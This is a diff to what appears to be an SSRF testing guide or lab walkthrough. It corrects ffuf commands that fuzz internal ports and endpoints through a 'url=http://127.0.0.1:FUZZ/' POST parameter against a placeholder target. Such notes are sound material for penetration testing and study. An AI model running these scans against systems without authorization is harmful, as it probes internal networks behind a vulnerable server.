@@ -39,7 +39,7 @@ seq 1 10000 > ports.txt
 ### Fuzz Open Ports
 
 ```bash
-ffuf -w ./ports.txt \
+ffuf -w ./ports.txt:FUZZ \
      -u http://TARGET/index.php \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -52,7 +52,7 @@ ffuf -w ./ports.txt \
 ## Enumerate Internal Endpoints
 
 ```bash
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt:FUZZ \
      -u http://TARGET/index.php \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -187,9 +187,10 @@ Look for different error messages:
 - Open port: `Date unavailable` (or different error)
 
 ```bash
-ffuf -w ./ports.txt \
+ffuf -w ./ports.txt:FUZZ \
      -u http://TARGET/index.php \
      -X POST \
+     -H "Content-Type: application/x-www-form-urlencoded" \
      -d "url=http://127.0.0.1:FUZZ/" \
      -mr "Date unavailable"
 ```
